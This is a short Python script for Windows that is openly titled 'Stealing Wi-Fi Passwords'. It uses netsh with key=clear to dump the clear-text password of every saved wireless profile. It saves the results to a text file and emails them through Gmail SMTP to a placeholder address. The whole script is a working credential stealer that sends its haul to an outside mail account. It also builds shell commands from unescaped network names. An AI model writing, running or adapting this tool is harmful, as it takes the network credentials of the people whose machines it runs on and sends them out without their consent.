#!/usr/bin/env python
import subprocess
import smtplib
import re
import time
from colorama import init, Fore		# for fancy/colorful display

class Wifi():
	def __init__(self):
		# initialize colorama
		init()
		# define colors
		self.GREEN = Fore.GREEN
		self.RED = Fore.RED
		self.Cyan = Fore.CYAN
		self.Yellow = Fore.YELLOW
		self.Blue = Fore.BLUE
		self.RESET = Fore.RESET

	def send_mail(self, email, password, msg):
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, msg)
		server.quit()

	def wifi(self):
		command = 'netsh wlan show profiles'
		network_names = subprocess.check_output(command, shell=True)
		pattern = re.compile(r'(?:All User.*:\s)(.*)')
		network_names_list = re.findall(pattern, network_names)	# returns a list of network names
		result = ""
		for network in network_names_list:
			cmd = 'netsh wlan show profiles ' + network + ' key=clear'
			current_result = subprocess.check_output(cmd, shell=True)
			result += current_result
		return result

	def display(self):
		subprocess.call('cls', shell=True)

		print('{}\n\n\t\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
		print('\n{}\t\t\t\t\t\t#\t          Stealing Wi-Fi Passwords \t\t#\n{}'.format(self.Cyan, self.RESET))
		print('{}\t\t\t\t\t\t#\t              ( For Windows )\t\t\t#\n{}'.format(self.Cyan, self.RESET))
		print('{}\t\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

	def start(self):
		self.display()
		print('\n\n{}[+] Stealing Wi-Fi Passwords ...{}'.format(self.Blue, self.RESET))
		credentials = self.wifi()	# function call
		with open('wifi_passwords.txt', 'w') as file:
			file.write(credentials)
		time.sleep(1)
		print('\n{}[+] File Successfully Created ...{}'.format(self.GREEN, self.RESET))
		time.sleep(1)
		print('\n{}[+] Sending Email ...{}'.format(self.RED, self.RESET))
		self.send_mail('username@gmail.com', 'password', credentials)
		time.sleep(1)
		print('\n{}[+] Exitting ...{}\n'.format(self.Yellow, self.RESET))
		time.sleep(1)

		# add attachments


if __name__ == '__main__':
	wifi = Wifi()
	wifi.start()
